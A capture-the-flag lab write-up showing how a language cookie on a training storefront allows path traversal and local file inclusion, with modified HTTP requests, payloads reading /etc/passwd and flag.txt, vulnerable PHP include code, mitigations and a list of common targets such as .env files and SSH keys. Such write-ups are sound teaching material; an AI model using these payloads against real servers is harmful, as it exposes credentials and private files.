---
title: "Local File Inclusion via Language Cookie Leads to Arbitrary File Read | Flagged"
date: 2026-06-04 13:00:00 +0530
categories: [A01 - Broken Access Control, Local File Inclusion]
tags: [webverselabs-pro, local-file-inclusion, lfi, path-traversal, file-read, cookie-manipulation]
author: Shivansh Sharma
image:
  path: /assets/images/posts/flagged-lfi-via-language-cookie.webp
  alt: Flagged Local File Inclusion via Language Cookie Leads to Arbitrary File Read
---


## Lab Link

Lab: [Flagged](https://dashboard.webverselabs-pro.com/mystery-challenges/flagged)

---

## Overview

Flagged is a long-running online storefront that manufactures custom sailing flags and supports multiple languages through a language-switching feature. The application allows visitors to select their preferred language, and the chosen value is stored within a cookie.

During testing, the language selection mechanism was found to trust user-supplied input without proper validation. By manipulating the language cookie, it became possible to perform path traversal and include arbitrary files from the server's filesystem.

This ultimately allowed access to sensitive files outside the intended language directory and resulted in disclosure of the challenge flag.

---

## Objective

Exploit the language selection functionality to perform Local File Inclusion and retrieve the flag from the underlying filesystem.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A01 - Broken Access Control
└── Local File Inclusion
    └── Path Traversal
        └── User-Controlled Language File Loading
```

---

## Reconnaissance

The application provides a language-switching feature allowing visitors to browse the website in multiple languages.

Available languages include:

```text
English
French
Dutch
Spanish
```

While changing languages, the following request was observed:

```http
GET /shop.php HTTP/2
Host: a41ea65a-4065-flagged-8cc5e.events.webverselabs-pro.com
Cookie: lang=es
```

The presence of a language identifier stored directly within a cookie suggested that the backend might be loading language files dynamically based on user input.

---

## Analyzing the Language Cookie

The application appears to use the cookie value to determine which language file should be loaded.

Observed cookie:

```text
lang=es
```

If the value is incorporated directly into filesystem operations, path traversal characters may allow access to files outside the expected language directory.

---

## Testing for Path Traversal

A path traversal payload was supplied within the cookie:

```text
../../../../../../etc/passwd
```

Modified request:

```http
GET /shop.php HTTP/2
Host: a41ea65a-4065-flagged-8cc5e.events.webverselabs-pro.com
Cookie: lang=../../../../../../etc/passwd
```

The response returned contents from the operating system's password file, confirming that the application was vulnerable to Local File Inclusion.

---

## Confirming Local File Inclusion

Successful disclosure of:

```text
/etc/passwd
```

demonstrated that arbitrary files could be read from the server.

This confirmed:

```text
Path Traversal
+
Local File Inclusion
```

through the language cookie parameter.

---

## Exploitation

After confirming file access, attention shifted toward discovering sensitive application files.

A common target in challenge environments is:

```text
flag.txt
```

The following payload was supplied:

```text
../../../flag.txt
```

Modified request:

```http
GET /shop.php HTTP/2
Host: a41ea65a-4065-flagged-8cc5e.events.webverselabs-pro.com
Cookie: lang=../../../flag.txt
```

---

## Flag Disclosure

The response returned:

```text
WEBVERSE{.....}
```

The flag was successfully disclosed through Local File Inclusion.

---

## Flag

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

Original cookie:

```text
lang=es
```

Path traversal test:

```text
lang=../../../../../../etc/passwd
```

Successful file disclosure:

```text
/etc/passwd
```

Flag retrieval payload:

```text
lang=../../../flag.txt
```

Result:

```text
WEBVERSE{.....}
```

---

## Root Cause Analysis

The application uses a user-controlled cookie value when selecting language resources.

A vulnerable implementation would resemble:

```php
include("languages/" . $_COOKIE['lang']);
```

or

```php
include($_COOKIE['lang']);
```

Because user input is not validated, attackers can inject traversal sequences such as:

```text
../
```

to escape the intended directory and access arbitrary files on the filesystem.

The absence of path validation and allowlisting results in Local File Inclusion.

---

## Impact

An attacker can:

* Read arbitrary files from the server
* Access application source code
* Retrieve configuration files
* Obtain credentials and secrets
* Enumerate system users
* Access sensitive application data

In some environments, Local File Inclusion can be escalated into Remote Code Execution.

---

## Mitigation

### Use an Allowlist

Only permit predefined language values:

```php
$allowed = ['en', 'fr', 'es', 'nl'];
```

Reject any value outside the approved list.

---

### Prevent Directory Traversal

Block traversal sequences such as:

```text
../
..\
```

before performing filesystem operations.

---

### Use Fixed Mappings

Instead of directly loading user-supplied paths:

```php
include($_COOKIE['lang']);
```

Use:

```php
$languages = [
    'en' => 'languages/en.php',
    'fr' => 'languages/fr.php',
    'es' => 'languages/es.php',
    'nl' => 'languages/nl.php'
];

include($languages[$lang]);
```

---

### Restrict File Access

Configure application permissions so web processes cannot access sensitive files outside required directories.

---

## Real-World Insight

Local File Inclusion vulnerabilities frequently arise in multilingual applications, template engines, and file-loading features where developers allow user input to influence filesystem operations.

Common attack targets include:

```text
/etc/passwd
config.php
.env
application source code
SSH keys
log files
```

The Flagged challenge demonstrates a critical security principle:

**User input should never directly determine which files are loaded from the server's filesystem.**
